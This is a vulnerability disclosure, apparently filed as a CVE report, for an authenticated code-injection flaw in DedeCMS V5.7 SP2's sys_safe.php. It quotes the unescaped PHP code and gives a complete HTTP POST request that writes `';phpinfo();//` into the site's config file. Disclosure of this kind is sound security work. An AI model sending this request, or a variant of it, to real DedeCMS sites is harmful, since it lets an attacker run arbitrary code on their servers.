# Vulnerability Info
## Vulnerability Type
Dedecms background getshell
## Vulnerability Version
V5.7 SP2
## Recurring environment
Windows 10* PHP 5.4.5* Apache 2.4.23
## Author
pang0lin@webray.com.cn inc.
#Vulnerability Description AND recurrence:
The security issue is occured at file /dede/sys_safe.php.
```
    //保存问答数组
    $faqs = array();
    for ($i = 1; $i <= count($question)-1; $i++) 
    {
        $val = trim($question[$i]);
        if($val)
        {
            $faqs[$i]['question'] = str_replace("'","\"",stripslashes($val));
            $faqs[$i]['answer'] = stripslashes(trim($answer[$i]));
        }
    }
    
    //print_r($question);exit();
    $configstr .= "\$safe_faqs = '".serialize($faqs)."';\r\n";
    $configstr = "<"."?php\r\n".$configstr."?".">\r\n";
    
    $fp = fopen($safeconfigfile, "w") or die("写入文件 $safeconfigfile 失败，请检查权限！");
    fwrite($fp, $configstr);
    fclose($fp);
    ShowMsg("修改配置成功！","sys_safe.php");
    exit;
```
It is very strange that the param $faqs[$i]['question'] is escape,but the param $faqs[$i]['answer'] not. Mybe the author forget to do it.
```
$faqs[$i]['question'] = str_replace("'","\"",stripslashes($val));
$faqs[$i]['answer'] = stripslashes(trim($answer[$i]));
```
How to use it? First, we need to login in and request it like blow.
```
POST /uploads/dede/sys_safe.php HTTP/1.1
Host: test.com
Content-Length: 903
Cache-Control: max-age=0
Origin: http://test.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://test.com/uploads/dede/sys_safe.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=b0skm3otr4mnf5757cqf36dri6; _csrf_name_ee43b998=f32d4d51d1e76e63fab9b13ba098da00; _csrf_name_ee43b998__ckMd5=742220487726259e; DedeUserID=1; DedeUserID__ckMd5=28220f93251d463f; DedeLoginTime=1577369105; DedeLoginTime__ckMd5=72b229209e37a095
Connection: close

dopost=save&gdopen%5B%5D=1&gdopen%5B%5D=2&gdopen%5B%5D=3&gdopen%5B%5D=4&gdopen%5B%5D=5&gdopen%5B%5D=6&gdopen%5B%5D=7&codetype=3&gdtype=1&gdstyle%5B%5D=3&gd_wwidth=68&gd_wheight=24&codelen=4&question%5B%5D=&answer%5B%5D=&question%5B%5D=%E6%82%A8%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E7%BD%91%E5%BB%BA%E7%A8%8B%E5%BA%8F%E6%98%AF%E4%BB%80%E4%B9%88%3F&answer%5B%5D=DedeCMS';phpinfo();//aasssss&question%5B%5D=1%2B11%3D%3F&answer%5B%5D=12&question%5B%5D=%E4%B8%AD%E5%9B%BD%E5%93%AA%E9%A1%B9%E4%BD%93%E8%82%B2%E8%BF%90%E5%8A%A8%E6%9C%80%E8%AE%A9%E4%BA%BA%E5%90%AC%E7%9D%80%E4%BC%A4%E5%BF%83%2C%E7%9C%8B%E7%9D%80%E6%8F%AA%E5%BF%83%3F&answer%5B%5D=%E8%B6%B3%E7%90%83&question%5B%5D=%3Cimg+src%3D%22%2Fimages%2Fdede.gif%22%2F%3E&answer%5B%5D=%E7%BB%87%E6%A2%A6%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&question%5B%5D=&answer%5B%5D=&gdfaq_reg=0&gdfaq_send=0&gdfaq_msg=1&imageField.x=43&imageField.y=13
```
And Then wen can see phpinfo page anywhere.
![blockchain](https://github.com/pang0lin/CVEproject/blob/main/imgs/dedecms_background_rce.png "Dedecms background getshell")
